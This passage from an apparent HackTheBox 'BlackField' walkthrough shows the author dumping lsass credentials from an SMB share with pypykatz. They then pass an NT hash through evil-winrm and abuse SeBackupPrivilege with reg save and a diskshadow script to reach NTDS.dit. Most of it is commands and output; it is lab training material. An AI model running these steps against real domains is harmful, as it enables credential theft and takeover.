</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch ~]<span class="nv">$ </span>smbclient <span class="nt">-U</span> audit2020 <span class="nt">-L</span> 10.10.10.192
Enter WORKGROUP<span class="se">\a</span>udit2020<span class="s1">'s password: 

		Sharename       Type      Comment
		---------       ----      -------
		ADMIN$          Disk      Remote Admin
		C$              Disk      Default share
		forensic        Disk      Forensic / Audit share.
		IPC$            IPC       Remote IPC
		NETLOGON        Disk      Logon server share 
		profiles$       Disk      
		SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
[cantchasee@arch ~]$ 
</span></pre></table></code></div></div><p>It worked from the user name I can say that we may have access to forensic share let’s give it a shot</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch ~]<span class="nv">$ </span>smbclient <span class="nt">-U</span> audit2020 <span class="se">\\\\</span>10.10.10.192<span class="se">\\</span>forensic
Enter WORKGROUP<span class="se">\a</span>udit2020<span class="s1">'s password: 
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sun Feb 23 14:03:16 2020
  ..                                  D        0  Sun Feb 23 14:03:16 2020
  commands_output                     D        0  Sun Feb 23 19:14:37 2020
  memory_analysis                     D        0  Thu May 28 20:28:33 2020
  tools                               D        0  Sun Feb 23 14:39:08 2020

				7846143 blocks of size 4096. 4210201 blocks available
smb: \&gt; 
</span></pre></table></code></div></div><p>Now we have access and these two first folders seems interesting after taking a look a commands_output folder there isn’t something helpful but the memory_analysis had a very interseting file</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>smb: <span class="se">\m</span>emory_analysis<span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Thu May 28 20:28:33 2020
  ..                                  D        0  Thu May 28 20:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 20:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 20:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 20:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 20:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 20:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 20:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 20:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 20:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 20:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 20:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 20:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 20:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 20:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 20:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 20:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 20:27:53 2020

				7846143 blocks of size 4096. 4209929 blocks available
smb: <span class="se">\m</span>emory_analysis<span class="se">\&gt;</span> 
</pre></table></code></div></div><p>These are processes names and from the folder name it appears like some memory dumps after doing some reseasrch it appears that we’ve got a very one it’s lsass.zip if you want to know about lsass.exe then google it :P now let’s download that file</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>smb: <span class="se">\m</span>emory_analysis<span class="se">\&gt;</span> get lsass.zip 
parallel_read returned NT_STATUS_IO_TIMEOUT
smb: <span class="se">\m</span>emory_analysis<span class="se">\&gt;</span> 
</pre></table></code></div></div><p>Oh it appears that the file is too big and smbclient can’t download it so let’s mount the share and then copy the file to our machine</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span><span class="nb">mkdir </span>memory_analysis
<span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span><span class="nb">sudo </span>mount <span class="nt">-t</span> cifs //10.10.10.192/forensic/memory_analysis /home/cantchasee/HackTheBox/BlackField/memory_analysis/ <span class="nt">-o</span> <span class="nv">user</span><span class="o">=</span>audit2020
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>cantchasee: 
Password <span class="k">for </span>audit2020@//10.10.10.192/forensic/memory_analysis: 
<span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span><span class="nb">cd </span>memory_analysis
<span class="o">[</span>cantchasee@arch memory_analysis]<span class="nv">$ </span><span class="nb">ls
</span>RuntimeBroker.zip  ctfmon.zip   lsass.zip        svchost.zip
ServerManager.zip  dfsrs.zip    mmc.zip          taskhostw.zip
WmiPrvSE.zip       dllhost.zip  sihost.zip       winlogon.zip
conhost.zip        ismserv.zip  smartscreen.zip  wlms.zip
<span class="o">[</span>cantchasee@arch memory_analysis]<span class="nv">$ </span><span class="nb">cp </span>lsass.zip ../
<span class="o">[</span>cantchasee@arch memory_analysis]<span class="nv">$ </span><span class="nb">cd</span> ..
<span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span><span class="nb">sudo </span>umont memory_analysis/
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>cantchasee: 
<span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>file lsass.zip 
lsass.zip: Zip archive data, at least v2.0 to extract
<span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>unzip lsass.zip 
Archive:  lsass.zip
inflating: lsass.DMP               
<span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>file lsass.DMP 
lsass.DMP: Mini DuMP crash report, 16 streams, Sun Feb 23 18:02:01 2020, 0x421826 <span class="nb">type</span>
</pre></table></code></div></div><p>after extracting the archive content we’ve found a mini dump file you’ll need mimikatz but I’m using linux I don’t have windows for our luck there is a tool that is the same as mimikatz but it’s written in python oh yeah you just need python and you’re ready to run it name is pypykatzyou can get it from <a href="https://github.com/skelsec/pypykatz">here</a> and now that you have all tools things that you need let’s dump some hashes :D but first let’s see how to use this tool</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>pypykatz <span class="nt">-h</span>
usage: pypykatz <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">-v</span><span class="o">]</span>
				<span class="o">{</span>live,lsa,registry,nt,lm,dcc,dcc2,gppass,dpapi,sake,version,banner<span class="o">}</span>
				...

Pure Python implementation of Mimikatz <span class="nt">--and</span> more--

positional arguments:
  <span class="o">{</span>live,lsa,registry,nt,lm,dcc,dcc2,gppass,dpapi,sake,version,banner<span class="o">}</span>
						commands
	live                Get secrets from live machine
	lsa                 Get secrets from memory dump
	registry            Get secrets from registry files
	nt                  Generates NT <span class="nb">hash </span>of the password
	lm                  Generates LM <span class="nb">hash </span>of the password
	dcc                 Generates DCC v1 <span class="o">(</span>domain cached credentials version 1<span class="o">)</span>
						<span class="nb">hash </span>of the password
	dcc2                Generates DCC v2 <span class="o">(</span>domain cached credentials version 2<span class="o">)</span>
						<span class="nb">hash </span>of the password
	gppass              Decrypt GP passwords
	dpapi               DPAPI <span class="o">(</span>offline<span class="o">)</span> related commands
	sake                sake
	version             version
	banner              banner

optional arguments:
   <span class="nt">-h</span>, <span class="nt">--help</span>            show this <span class="nb">help </span>message and <span class="nb">exit</span>
   <span class="nt">-v</span>, <span class="nt">--verbose</span>
<span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>
</pre></table></code></div></div><p>SO we need to use it with lsa argument</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>pypykatz lsa
usage: pypykatz lsa <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">-t</span> TIMESTAMP_OVERRIDE] <span class="o">[</span><span class="nt">--json</span><span class="o">]</span> <span class="o">[</span><span class="nt">-e</span><span class="o">]</span> <span class="o">[</span><span class="nt">-o</span> OUTFILE]
					<span class="o">[</span><span class="nt">-k</span> KERBEROS_DIR] <span class="o">[</span><span class="nt">-r</span><span class="o">]</span> <span class="o">[</span><span class="nt">-d</span><span class="o">]</span> <span class="o">[</span><span class="nt">-g</span><span class="o">]</span>
					<span class="o">{</span>minidump,rekall<span class="o">}</span> memoryfile
pypykatz lsa: error: the following arguments are required: cmd, memoryfile
</pre></table></code></div></div><p>You remember our file is a minidump so the complete command will be:</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>pypykatz lsa minidump lsass.DMP <span class="nt">-o</span> lsass_dmp
INFO:root:Parsing file lsass.DMP
<span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span><span class="nb">cat </span>lsass_dmp 
FILE: <span class="o">========</span> lsass.DMP <span class="o">=======</span>

<span class="o">==</span> LogonSession <span class="o">==</span>
authentication_id 406458 <span class="o">(</span>633ba<span class="o">)</span>
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
<span class="o">==</span> MSV <span class="o">==</span>
Username: svc_backup
Domain: BLACKFIELD
LM: NA
NT: 9658d1d1dcd9250115e2205d9f48400d
SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
<span class="o">==</span> WDIGEST <span class="o">[</span>633ba]<span class="o">==</span>
username svc_backup
domainname BLACKFIELD
password None
<span class="o">==</span> SSP <span class="o">[</span>633ba]<span class="o">==</span>
username 
domainname 
password None
<span class="o">==</span> Kerberos <span class="o">==</span>
Username: svc_backup
Domain: BLACKFIELD.LOCAL
Password: None
<span class="nb">.</span>
<span class="nb">.</span>
<span class="nb">.</span>
<span class="nb">.</span>
</pre></table></code></div></div><p>the file is too long so I’ll just put here the most important part of it as you can see we’ve got all users hash you’ll also find Administrator hash but you can’t use it I guess cuz the Administrator changed his password anyway we’ve got svc_backup hash let’s use it to login</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="o">[</span>cantchasee@arch BlackField]<span class="nv">$ </span>evil-winrm <span class="nt">-H</span> 9658d1d1dcd9250115e2205d9f48400d <span class="nt">-u</span> svc_backup <span class="nt">-i</span> 10.10.10.192

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; 
</pre></table></code></div></div><p>Finally a shell :D I’m not going to put here why you can login without knowing the password maybe I’ll write an article about it but if you’re interested google is always your friend so as usally let’s see what can we do with that user</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/all</span><span class="w">

</span><span class="nf">USER</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
</span><span class="nf">----------------</span><span class="w">

</span><span class="nf">User</span><span class="w"> </span><span class="nx">Name</span><span class="w">             </span><span class="nx">SID</span><span class="w">
</span><span class="o">=====================</span><span class="w"> </span><span class="o">==============================================</span><span class="w">
</span><span class="nf">blackfield\svc_backup</span><span class="w"> </span><span class="nx">S-1-5-21-4194615774-2175524697-3563712290-1413</span><span class="w">


</span><span class="nf">GROUP</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
</span><span class="nf">-----------------</span><span class="w">

</span><span class="nf">Group</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                 </span><span class="nx">Type</span><span class="w">             </span><span class="nx">SID</span><span class="w">          </span><span class="nx">Attributes</span><span class="w">
</span><span class="o">==========================================</span><span class="w"> </span><span class="o">================</span><span class="w"> </span><span class="o">============</span><span class="w"> </span><span class="o">==================================================</span><span class="w">
</span><span class="nf">Everyone</span><span class="w">                                   </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-1-0</span><span class="w">      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">BUILTIN\Backup</span><span class="w"> </span><span class="nx">Operators</span><span class="w">                   </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-551</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">BUILTIN\Remote</span><span class="w"> </span><span class="nx">Management</span><span class="w"> </span><span class="nx">Users</span><span class="w">            </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-580</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">BUILTIN\Users</span><span class="w">                              </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-545</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">BUILTIN\Pre-Windows</span><span class="w"> </span><span class="nx">2000</span><span class="w"> </span><span class="nx">Compatible</span><span class="w"> </span><span class="nx">Access</span><span class="w"> </span><span class="nx">Alias</span><span class="w">            </span><span class="nx">S-1-5-32-554</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NETWORK</span><span class="w">                       </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-2</span><span class="w">      </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\Authenticated</span><span class="w"> </span><span class="nx">Users</span><span class="w">           </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-11</span><span class="w">     </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\This</span><span class="w"> </span><span class="nx">Organization</span><span class="w">             </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-15</span><span class="w">     </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">NT</span><span class="w"> </span><span class="nx">AUTHORITY\NTLM</span><span class="w"> </span><span class="nx">Authentication</span><span class="w">           </span><span class="nx">Well-known</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">S-1-5-64-10</span><span class="w">  </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">group</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">default</span><span class="p">,</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> </span><span class="nx">group</span><span class="w">
</span><span class="nf">Mandatory</span><span class="w"> </span><span class="nx">Label\High</span><span class="w"> </span><span class="nx">Mandatory</span><span class="w"> </span><span class="nx">Level</span><span class="w">       </span><span class="nx">Label</span><span class="w">            </span><span class="nx">S-1-16-12288</span><span class="w">


</span><span class="nf">PRIVILEGES</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
</span><span class="nf">----------------------</span><span class="w">

</span><span class="nf">Privilege</span><span class="w"> </span><span class="nx">Name</span><span class="w">                </span><span class="nx">Description</span><span class="w">                    </span><span class="nx">State</span><span class="w">
</span><span class="o">=============================</span><span class="w"> </span><span class="o">==============================</span><span class="w"> </span><span class="o">=======</span><span class="w">
</span><span class="nf">SeMachineAccountPrivilege</span><span class="w">     </span><span class="nx">Add</span><span class="w"> </span><span class="nx">workstations</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">domain</span><span class="w">     </span><span class="nx">Enabled</span><span class="w">
</span><span class="nf">SeBackupPrivilege</span><span class="w">             </span><span class="nx">Back</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="nx">files</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">directories</span><span class="w">  </span><span class="nx">Enabled</span><span class="w">
</span><span class="nf">SeRestorePrivilege</span><span class="w">            </span><span class="nx">Restore</span><span class="w"> </span><span class="nx">files</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">directories</span><span class="w">  </span><span class="nx">Enabled</span><span class="w">
</span><span class="nf">SeShutdownPrivilege</span><span class="w">           </span><span class="nx">Shut</span><span class="w"> </span><span class="nx">down</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">system</span><span class="w">           </span><span class="nx">Enabled</span><span class="w">
</span><span class="nf">SeChangeNotifyPrivilege</span><span class="w">       </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="nx">checking</span><span class="w">       </span><span class="nx">Enabled</span><span class="w">
</span><span class="nf">SeIncreaseWorkingSetPrivilege</span><span class="w"> </span><span class="nx">Increase</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">working</span><span class="w"> </span><span class="nx">set</span><span class="w"> </span><span class="nx">Enabled</span><span class="w">


</span><span class="nf">USER</span><span class="w"> </span><span class="nx">CLAIMS</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
</span><span class="nf">-----------------------</span><span class="w">
</span><span class="nf">User</span><span class="w"> </span><span class="nx">claims</span><span class="w"> </span><span class="nx">unknown.</span><span class="w">

</span><span class="nf">Kerberos</span><span class="w"> </span><span class="nx">support</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">Dynamic</span><span class="w"> </span><span class="nx">Access</span><span class="w"> </span><span class="nx">Control</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">device</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">been</span><span class="w"> </span><span class="nx">disabled.</span><span class="w">
</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Documents</span><span class="err">&gt;</span><span class="w"> 
</span></pre></table></code></div></div><p>We’ve got something that we can abuse some very good privileges SeBackupPrivilege and SeRestorePrivilege the SeBackupPrivilege give us the ability to copy any file cuz we’re doing some backup ;) so let’s start by creating a folder where we do our work</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="o">..</span><span class="w">
</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_backup</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">mkdir</span><span class="w"> </span><span class="nx">Temp</span><span class="w">


</span><span class="nf">Directory:</span><span class="w"> </span><span class="nx">C:\Users\svc_backup</span><span class="w">


</span><span class="nf">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="nf">----</span><span class="w">                </span><span class="nf">-------------</span><span class="w">         </span><span class="nf">------</span><span class="w"> </span><span class="nf">----</span><span class="w">
</span><span class="nf">d-----</span><span class="w">         </span><span class="nx">9/7/2020</span><span class="w">   </span><span class="nx">3:22</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Temp</span><span class="w">


</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_backup</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="nx">Temp</span><span class="w">
</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Temp</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><p>and now we will need 2 things SYSTEM hive and NTDS.dit file the first one iz eazy to get</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\SYSTEM</span><span class="w"> </span><span class="nx">system.hive</span><span class="w">
</span><span class="nf">The</span><span class="w"> </span><span class="nx">operation</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
</span></pre></table></code></div></div><p>and then download the file</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">download</span><span class="w"> </span><span class="nx">system.hive</span><span class="w">
</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Downloading</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Temp\system.hive</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">system.hive</span><span class="w">


</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Download</span><span class="w"> </span><span class="nx">successful</span><span class="o">!</span><span class="w">

</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\svc_backup\Temp</span><span class="err">&gt;</span><span class="w"> 
</span></pre></table></code></div></div><p>it’s going to take you some while to download the file depeneding on your internet connection now let’s get the NTDS.dit file since we are member of the Backup Operators group we shall have some backing tool I found that we can use diskshadow wich is a backing up utility using after some googling I found a <a href="https://pentestlab.blog/tag/ntds-dit/">blog</a> and I follow it first let’s creat the script file that diskshadow will run here is it</p><pre><code class="language-txt">set context persistent nowriters#
add volume c: alias someAlias#
create#
expose %someAlias% z:#
</code></pre><p>put the following in a file and let’s name it script.txt then do the following:</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre><span class="w">
</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">mkdir</span><span class="w"> </span><span class="nx">tmp</span><span class="w">


</span><span class="nf">Directory:</span><span class="w"> </span><span class="nx">C:\</span><span class="w">


</span><span class="nf">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
</span><span class="nf">----</span><span class="w">                </span><span class="nf">-------------</span><span class="w">         </span><span class="nf">------</span><span class="w"> </span><span class="nf">----</span><span class="w">
</span><span class="nf">d-----</span><span class="w">         </span><span class="nx">9/7/2020</span><span class="w">   </span><span class="nx">4:35</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">tmp</span><span class="w">


</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="nx">tmp</span><span class="w">
</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">upload</span><span class="w"> </span><span class="nx">script.txt</span><span class="w">
</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Uploading</span><span class="w"> </span><span class="nx">script.txt</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">C:\tmp\script.txt</span><span class="w">


</span><span class="kr">Data</span><span class="p">:</span><span class="w"> </span><span class="mi">128</span><span class="w"> </span><span class="nf">bytes</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">128</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">copied</span><span class="w">

</span><span class="nf">Info:</span><span class="w"> </span><span class="nx">Upload</span><span class="w"> </span><span class="nx">successful</span><span class="o">!</span><span class="w">

</span><span class="o">*</span><span class="nf">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">diskshadow</span><span class="w"> </span><span class="nx">/s</span><span class="w"> </span><span class="nx">script.txt</span><span class="w">
</span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">DiskShadow</span><span class="w"> </span><span class="nx">version</span><span class="w"> </span><span class="nx">1.0</span><span class="w">
</span><span class="nf">Copyright</span><span class="w"> </span><span class="p">(</span><span class="nf">C</span><span class="p">)</span><span class="w"> </span><span class="mi">2013</span><span class="w"> </span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">Corporation</span><span class="w">
